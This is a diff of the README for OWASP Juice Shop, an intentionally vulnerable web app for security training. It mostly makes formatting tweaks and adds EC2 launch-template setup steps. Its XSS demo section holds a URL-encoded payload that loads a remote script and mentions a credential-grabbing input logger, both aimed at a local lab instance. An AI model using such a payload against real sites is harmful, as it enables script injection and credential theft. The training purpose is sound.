@@ -1,12 +1,12 @@
 # ![Juice Shop Logo](https://raw.githubusercontent.com/bkimminich/juice-shop/develop/frontend/src/assets/public/images/JuiceShop_Logo_100px.png) OWASP Juice Shop [![OWASP Flagship](https://img.shields.io/badge/owasp-flagship%20project-48A646.svg)](https://www.owasp.org/index.php/OWASP_Project_Inventory#tab=Flagship_Projects) [![GitHub release](https://img.shields.io/github/release/bkimminich/juice-shop.svg)](https://github.com/bkimminich/juice-shop/releases/latest) [![Twitter Follow](https://img.shields.io/twitter/follow/owasp_juiceshop.svg?style=social&label=Follow)](https://twitter.com/owasp_juiceshop)
 
-[![Build Status](https://travis-ci.org/bkimminich/juice-shop.svg?branch=master)](https://travis-ci.org/bkimminich/juice-shop)
-[![Build status](https://ci.appveyor.com/api/projects/status/903c6mnns4t7p6fa/branch/master?svg=true)](https://ci.appveyor.com/project/bkimminich/juice-shop/branch/master)
-[![Test Coverage](https://api.codeclimate.com/v1/badges/2a7af720d39b08a09904/test_coverage)](https://codeclimate.com/github/bkimminich/juice-shop/test_coverage)
+[![Build Status](https://travis-ci.org/bkimminich/juice-shop.svg?branch=master)](https://travis-ci.org/bkimminich/juice-shop)
+[![Build status](https://ci.appveyor.com/api/projects/status/903c6mnns4t7p6fa/branch/master?svg=true)](https://ci.appveyor.com/project/bkimminich/juice-shop/branch/master)
+[![Test Coverage](https://api.codeclimate.com/v1/badges/2a7af720d39b08a09904/test_coverage)](https://codeclimate.com/github/bkimminich/juice-shop/test_coverage)
 [![Maintainability](https://api.codeclimate.com/v1/badges/2a7af720d39b08a09904/maintainability)](https://codeclimate.com/github/bkimminich/juice-shop/maintainability)
-[![Greenkeeper badge](https://badges.greenkeeper.io/bkimminich/juice-shop-ctf.svg)](https://greenkeeper.io/)
-[![CII Best Practices](https://bestpractices.coreinfrastructure.org/projects/223/badge)](https://bestpractices.coreinfrastructure.org/projects/223)
-![GitHub stars](https://img.shields.io/github/stars/bkimminich/juice-shop.svg?label=GitHub%20%E2%98%85&style=flat)
+[![Greenkeeper badge](https://badges.greenkeeper.io/bkimminich/juice-shop-ctf.svg)](https://greenkeeper.io/)
+[![CII Best Practices](https://bestpractices.coreinfrastructure.org/projects/223/badge)](https://bestpractices.coreinfrastructure.org/projects/223)
+![GitHub stars](https://img.shields.io/github/stars/bkimminich/juice-shop.svg?label=GitHub%20%E2%98%85&style=flat)
 
 > [The most trustworthy online shop out there.](https://twitter.com/dschadow/status/706781693504589824)
 > ([@dschadow](https://github.com/dschadow)) —
@@ -16,9 +16,9 @@
 > ([@vanderaj](https://twitter.com/vanderaj)) —
 > [First you 😂😂then you 😢](https://twitter.com/kramse/status/1073168529405472768) ([@kramse](https://twitter.com/kramse))
 
-OWASP Juice Shop is probably the most modern and sophisticated insecure web application! It can be used in security trainings, awareness demos, CTFs and as a guinea pig for security tools! Juice Shop encompasses vulnerabilities from the entire [OWASP Top Ten](https://www.owasp.org/index.php/OWASP_Top_Ten) along with many other security flaws found in real-world applications!
+OWASP Juice Shop is probably the most modern and sophisticated insecure web application! It can be used in security trainings, awareness demos, CTFs and as a guinea pig for security tools! Juice Shop encompasses vulnerabilities from the entire [OWASP Top Ten](https://www.owasp.org/index.php/OWASP_Top_Ten) along with many other security flaws found in real-world applications!
 
-![Juice Shop Screenshot Slideshow](screenshots/slideshow.gif)
+![Juice Shop Screenshot Slideshow](screenshots/slideshow.gif)
 
 For a detailed introduction, full list of features and architecture
 overview please visit the official project page:
@@ -110,13 +110,14 @@ overview please visit the official project page:
 
 ### Amazon EC2 Instance
 
-1. Setup an _Amazon Linux AMI_ instance
-2. In _Step 3: Configure Instance Details_ unfold _Advanced Details_ and
+1. In the _EC2_ sidenav select _Instances_ and click _Launch Instance_
+2. In _Step 1: Choose an Amazon Machine Image (AMI)_ choose an _Amazon Linux AMI_ or _Amazon Linux 2 AMI_
+3. In _Step 3: Configure Instance Details_ unfold _Advanced Details_ and
    copy the script below into _User Data_
-3. In _Step 6: Configure Security Group_ add a _Rule_ that opens port 80
+4. In _Step 6: Configure Security Group_ add a _Rule_ that opens port 80
    for HTTP
-4. Launch instance
-5. Browse to your instance's public DNS
+5. Launch your instance
+6. Browse to your instance's public DNS
 
 ```
 #!/bin/bash
@@ -126,6 +127,16 @@ service docker start
 docker pull bkimminich/juice-shop
 docker run -d -p 80:3000 bkimminich/juice-shop
 ```
+
+#### Don't repeat yourself: Define an EC2 Launch Template
+
+1. In the _EC2_ sidenav select _Launch Templates_ and click _Create launch template_
+2. Under _Launch template contents_ select as _AMI ID_ either _Amazon Linux AMI_ or _Amazon Linux 2 AMI_ (by using _Search for AMI_)
+3. In the same section add a _Security Group_ that opens port 80 for HTTP
+4. Unfold _Advanced details_ at the bottom of the screen and paste in the script above into _User Data_
+5. Create your launch template
+6. Launch one or multiple EC2 instances from your template
+7. Browse to your instance's public DNS
 
 > Technically Amazon could view hacking activity on any EC2 instance as
 > an attack on their AWS infrastructure! We highly discourage aggressive
@@ -156,7 +167,7 @@ docker run -d -p 80:3000 bkimminich/juice-shop
 
 OWASP Juice Shop officially supports the following versions of
 [node.js](http://nodejs.org) in line as close as possible with the
-official [node.js LTS schedule](https://github.com/nodejs/LTS). Docker
+official [node.js LTS schedule](https://github.com/nodejs/LTS). Docker
 images and packaged distributions are offered accordingly:
 
 | node.js  | [Docker image](https://registry.hub.docker.com/u/bkimminich/juice-shop)             | [Packaged distributions](https://github.com/bkimminich/juice-shop/releases/latest)         |
@@ -181,7 +192,7 @@ Via a YAML configuration file in `/config`, the OWASP Juice Shop can be
 customized in its content and look & feel.
 
 For detailed instructions and examples please refer to
-[our _Customization_ documentation](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/customization.html).
+[our _Customization_ documentation](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/customization.html).
 
 ## CTF-Extension
 
@@ -192,7 +203,7 @@ conveniently using the official
 tool.
 
 For step-by-step instructions and examples please refer to
-[the _Hosting a CTF event_ chapter](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/ctf.html)
+[the _Hosting a CTF event_ chapter](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/ctf.html)
 of our companion guide ebook.
 
 ## XSS Demo
@@ -203,9 +214,9 @@ can download this
 [docker-compose](https://raw.githubusercontent.com/wurstbrot/shake-logger/master/docker-compose.yml)-file
 and run `docker-compose up` to start the juice-shop and the
 shake-logger. Assume you received and (of course) clicked
-[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cimg+src%3Dx+onerror%3D%27var+js%3Ddocument.createElement%28%22script%22%29%3Bjs.type+%3D+%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar+hash%3Dwindow.location.hash%3Bwindow.location.hash%3Dhash.substr%280%2C8%29%3B%27%2F%3Eapple)
+[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cimg+src%3Dx+onerror%3D%27var+js%3Ddocument.createElement%28%22script%22%29%3Bjs.type+%3D+%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar+hash%3Dwindow.location.hash%3Bwindow.location.hash%3Dhash.substr%280%2C8%29%3B%27%2F%3Eapple)
 and login. Apart from the visual/audible effect, the attacker also
-installed [an input logger](http://localhost:8080/logger.php) to grab
+installed [an input logger](http://localhost:8080/logger.php) to grab
 credentials! This could easily run on a 3rd party server in real life!
 
 > You can also find a recording of this attack in action on YouTube:
@@ -220,16 +231,16 @@ This is the official companion guide to the OWASP Juice Shop. It will
 give you a complete overview of the vulnerabilities found in the
 application including hints how to spot and exploit them. In the
 appendix you will even find complete step-by-step solutions to every
-challenge. [Pwning OWASP Juice Shop](https://leanpub.com/juice-shop) is
+challenge. [Pwning OWASP Juice Shop](https://leanpub.com/juice-shop) is
 published with
 [GitBook](https://www.gitbook.com/book/bkimminich/pwning-owasp-juice-shop)
 under
-[CC BY-NC-ND 4.0](https://creativecommons.org/licenses/by-nc-nd/4.0/)
+[CC BY-NC-ND 4.0](https://creativecommons.org/licenses/by-nc-nd/4.0/)
 and is available **for free** in PDF, Kindle and ePub format. You can
 also
-[browse the full content online](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content)!
+[browse the full content online](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content)!
 
-[![Pwning OWASP Juice Shop Cover](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/cover_small.jpg)](https://leanpub.com/juice-shop)
+[![Pwning OWASP Juice Shop Cover](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/cover_small.jpg)](https://leanpub.com/juice-shop)
 
 ### Slide Decks
 
@@ -243,7 +254,7 @@ also
 If you need help with the application setup please check the
 [TROUBLESHOOTING.md](TROUBLESHOOTING.md) or post your specific problem
 or question in the
-[official Gitter Chat](https://gitter.im/bkimminich/juice-shop).
+[official Gitter Chat](https://gitter.im/bkimminich/juice-shop).
 
 ## Contributing [![GitHub contributors](https://img.shields.io/github/contributors/bkimminich/juice-shop.svg)](https://github.com/bkimminich/juice-shop/graphs/contributors) [![Waffle.io - Columns and their card count](https://badge.waffle.io/bkimminich/juice-shop.svg?columns=all)](https://waffle.io/bkimminich/juice-shop) [![JavaScript Style Guide](https://img.shields.io/badge/code%20style-standard-brightgreen.svg)](http://standardjs.com/) [![Crowdin](https://d322cqt584bo4o.cloudfront.net/owasp-juice-shop/localized.svg)](https://crowdin.com/project/owasp-juice-shop) [![Bountysource Activity](https://img.shields.io/bountysource/team/juice-shop/activity.svg)](https://www.bountysource.com/teams/juice-shop)
 
@@ -280,15 +291,15 @@ forking and opening a Pull Request!
   sticker sheets and temporary tattoos.
 
 The most honorable way to get some stickers is to
-[contribute to the project](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/contribution.html)
+[contribute to the project](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/contribution.html)
 by fixing an issue, finding a serious bug or submitting a good idea for
 a new challenge!
 
 We're also happy to supply you with stickers if you organize a meetup or
 conference talk where you use or talk about or hack the OWASP Juice
 Shop! Just
-[contact the mailing list](mailto:owasp_juice_shop_project@lists.owasp.org)
-or [the project leader](mailto:bjoern.kimminich@owasp.org) to discuss
+[contact the mailing list](mailto:owasp_juice_shop_project@lists.owasp.org)
+or [the project leader](mailto:bjoern.kimminich@owasp.org) to discuss
 your plans! !
 
 ## Donations
@@ -302,9 +313,9 @@ way to support the project.
 ### Credit Card (through RegOnline)
 
 OWASP hosts a
-[donation form on RegOnline](https://www.regonline.com/Register/Checkin.aspx?EventID=1044369).
+[donation form on RegOnline](https://www.regonline.com/Register/Checkin.aspx?EventID=1044369).
 Refer to the
-[Credit card donation step-by-step](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/donations.html#credit-card-donation-step-by-step)
+[Credit card donation step-by-step](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/donations.html#credit-card-donation-step-by-step)
 guide for help with filling out the donation form correctly.
 
 ### Liberapay [![Liberapay receiving](https://img.shields.io/liberapay/receives/bkimminich.svg)](https://liberapay.com/bkimminich/donate)
@@ -330,7 +341,7 @@ For a list of all contributors to the OWASP Juice Shop please visit our
 ## Licensing [![license](https://img.shields.io/github/license/bkimminich/juice-shop.svg)](LICENSE)
 
 This program is free software: you can redistribute it and/or modify it
-under the terms of the [MIT license](LICENSE). OWASP Juice Shop and any
+under the terms of the [MIT license](LICENSE). OWASP Juice Shop and any
 contributions are Copyright © by Bjoern Kimminich 2014-2019.
 
-![Juice Shop Logo](https://raw.githubusercontent.com/bkimminich/juice-shop/develop/frontend/src/assets/public/images/JuiceShop_Logo_400px.png)
+![Juice Shop Logo](https://raw.githubusercontent.com/bkimminich/juice-shop/develop/frontend/src/assets/public/images/JuiceShop_Logo_400px.png)
